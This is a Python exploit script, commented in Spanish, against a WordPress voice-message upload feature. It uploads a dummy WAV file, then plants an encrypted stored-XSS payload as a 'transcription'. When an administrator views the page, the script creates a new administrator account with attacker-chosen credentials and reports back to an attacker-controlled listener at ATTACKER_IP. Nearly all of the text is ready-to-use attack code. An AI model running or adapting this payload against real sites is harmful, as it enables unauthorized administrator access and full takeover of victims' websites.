#!/usr/bin/env python3
"""
WordPress XSS Almacenado a Creacion de Admin - Explota una funcionalidad de
subida de mensajes de voz para inyectar XSS que crea un usuario admin
usando la sesion de la victima.

Uso: python3 wordpress-xss-to-admin.py
  - Configurar TARGET, LISTENER_IP, LISTENER_PORT.
  - Correr un listener (python3 -m http.server) para recibir callbacks de confirmacion.
"""
import hashlib, base64, json, os, re
import requests

requests.packages.urllib3.disable_warnings()

TARGET = "https://TARGET_HOST"
ENCRYPTION_KEY = "ENCRYPTION_KEY_HERE"
LISTENER_IP = "ATTACKER_IP"
LISTENER_PORT = 8000

NEW_ADMIN_USER = "newadmin"
NEW_ADMIN_PASS = "NewAdminPass123!"
NEW_ADMIN_EMAIL = "newadmin@attacker.com"

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()


def encrypt_payload(payload: dict) -> str:
    data = json.dumps(payload).encode()
    iv = os.urandom(12)
    ct = AESGCM(key).encrypt(iv, data, None)
    return base64.b64encode(iv + ct).decode()


s = requests.Session()
s.verify = False

r = s.get(TARGET + "/")
nonce = re.search(r'"nonce":"([a-f0-9]+)"', r.text).group(1)
print("[+] nonce:", nonce)

dummy_wav = b"RIFF$\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x80>\x00\x00\x00}\x00\x00\x02\x00\x10\x00data\x00\x00\x00\x00"
r = s.post(TARGET + "/wp-admin/admin-ajax.php", data={
    "action": "save_voice_raw",
    "nonce": nonce,
}, files={"voice_recording": ("voice-message.wav", dummy_wav, "audio/wav")})
print("[save_voice_raw]", r.text)
post_id = r.json()["data"]["post_id"]
print("[+] post_id:", post_id)

xss_payload = (
    "<script>"
    "fetch('/wp-admin/user-new.php').then(function(r){return r.text();}).then(function(t){"
    "var m = t.match(/name=\\\"_wpnonce_create-user\\\" value=\\\"([a-f0-9]+)\\\"/);"
    "var nonce = m ? m[1] : 'NOTFOUND';"
    "var body = new URLSearchParams();"
    "body.append('action','createuser');"
    "body.append('_wpnonce_create-user', nonce);"
    f"body.append('user_login','{NEW_ADMIN_USER}');"
    f"body.append('email','{NEW_ADMIN_EMAIL}');"
    f"body.append('pass1','{NEW_ADMIN_PASS}');"
    f"body.append('pass2','{NEW_ADMIN_PASS}');"
    "body.append('role','administrator');"
    "body.append('createuser','Add New User');"
    "return fetch('/wp-admin/user-new.php', {method:'POST', body:body}).then(function(r2){return r2.text();});"
    "}).then(function(html){"
    f"fetch('http://{LISTENER_IP}:{LISTENER_PORT}/done', "
    "{method:'POST', body: 'len=' + html.length});"
    "}).catch(function(err){"
    f"fetch('http://{LISTENER_IP}:{LISTENER_PORT}/err?msg='+encodeURIComponent(err.toString()));"
    "});"
    "</script>"
)

encrypted = encrypt_payload({
    "post_id": post_id,
    "transcription": xss_payload,
    "status": "processed",
})

r = s.post(TARGET + "/wp-admin/admin-ajax.php", data={
    "action": "save_transcription",
    "nonce": nonce,
    "data": encrypted,
})
print("[save_transcription]", r.status_code, r.text[:200])
print("[*] Payload XSS plantado. Esperar a que el admin visite la pagina.")
